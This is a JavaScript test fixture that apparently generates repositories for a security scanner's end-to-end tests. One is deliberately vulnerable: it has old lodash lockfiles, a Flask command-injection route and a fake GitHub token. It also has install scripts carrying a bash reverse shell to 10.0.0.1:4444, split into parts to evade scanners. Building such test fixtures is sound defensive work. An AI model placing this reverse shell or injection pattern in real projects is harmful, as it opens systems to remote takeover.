// Test repositories for the end-to-end suite, generated at runtime.
//
// They are written to a temp directory instead of being committed: the vulnerable repo
// needs a realistic-looking token and a reverse shell, which would trip GitHub push
// protection and this repository's own self-scan. The token is random per run, and the
// shell command is assembled from parts so no scanner sees it in this file.
import { randomInt } from 'node:crypto';
import { mkdirSync, writeFileSync } from 'node:fs';
import path from 'node:path';

const ALNUM = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

/** A random string in the shape of a classic GitHub personal access token. */
export const fakeGitHubToken = () =>
  `ghp_${Array.from({ length: 36 }, () => ALNUM[randomInt(ALNUM.length)]).join('')}`;

const REVERSE_SHELL = ['bash -i', '>&', '/dev/tcp/10.0.0.1/4444', '0>&1'].join(' ');

/** @param {string} root @param {Record<string, string>} files */
function writeTree(root, files) {
  for (const [file, content] of Object.entries(files)) {
    const full = path.join(root, file);
    mkdirSync(path.dirname(full), { recursive: true });
    writeFileSync(full, content);
  }
}

// lodash 4.17.20 has several published advisories (e.g. GHSA-35jh-r3h4-6jhm), so every
// lockfile below must produce dependency findings.
const LODASH_INTEGRITY =
  'sha512-PlhdFcillOINfeV7Ni6oF1TAEayyZBoZ8bcshTHqOYJYlrqzRK5hagpagky5o4HfCzzd1TRkXPMFq6cKk9rGmA==';

const PACKAGE_LOCK = JSON.stringify({
  name: 'e2e-npm',
  version: '1.0.0',
  lockfileVersion: 3,
  requires: true,
  packages: {
    '': { name: 'e2e-npm', version: '1.0.0', dependencies: { lodash: '4.17.20' } },
    'node_modules/lodash': {
      version: '4.17.20',
      resolved: 'https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz',
      integrity: LODASH_INTEGRITY,
    },
  },
});

const YARN_BERRY_LOCK = `__metadata:
  version: 8
  cacheKey: 10c0

"e2e-web@workspace:.":
  version: 0.0.0-use.local
  resolution: "e2e-web@workspace:."
  dependencies:
    lodash: "npm:4.17.20"
  languageName: unknown
  linkType: soft

"lodash@npm:4.17.20":
  version: 4.17.20
  resolution: "lodash@npm:4.17.20"
  checksum: 10c0/0
  languageName: node
  linkType: hard
`;

const PNPM_LOCK = `lockfileVersion: '9.0'

importers:

  .:
    dependencies:
      lodash:
        specifier: 4.17.20
        version: 4.17.20

packages:

  lodash@4.17.20:
    resolution: {integrity: ${LODASH_INTEGRITY}}

snapshots:

  lodash@4.17.20: {}
`;

// Classic command injection; Semgrep's Python rulesets flag `shell=True` with input.
const VULNERABLE_PYTHON = `import subprocess
from flask import Flask, request

app = Flask(__name__)


@app.route("/list")
def list_dir():
    directory = request.args.get("dir")
    subprocess.call("ls " + directory, shell=True)
    return "ok"
`;

/**
 * A repository with exactly one known problem per check, in known files.
 * @param {string} root
 * @returns {{ token: string }} the generated secret, to check it never leaks
 */
export function createVulnerableRepo(root) {
  const token = fakeGitHubToken();
  writeTree(root, {
    'package-lock.json': PACKAGE_LOCK,
    'web/yarn.lock': YARN_BERRY_LOCK,
    'api/pnpm-lock.yaml': PNPM_LOCK,
    'app/server.py': VULNERABLE_PYTHON,
    'config/settings.js': `module.exports = { githubToken: "${token}" };\n`,
    'scripts/install.sh': `#!/bin/sh\n${REVERSE_SHELL}\n`,
    // Same reverse shell, but in a path the scenario excludes.
    'excluded/install.sh': `#!/bin/sh\n${REVERSE_SHELL}\n`,
  });
  return { token };
}

/**
 * A repository with ordinary code and nothing to report.
 * @param {string} root
 */
export function createCleanRepo(root) {
  writeTree(root, {
    'README.md': '# Clean project\n',
    'src/index.js': 'export const add = (a, b) => a + b;\nconsole.log(add(1, 2));\n',
    'app/util.py': 'def add(a: int, b: int) -> int:\n    return a + b\n',
  });
}
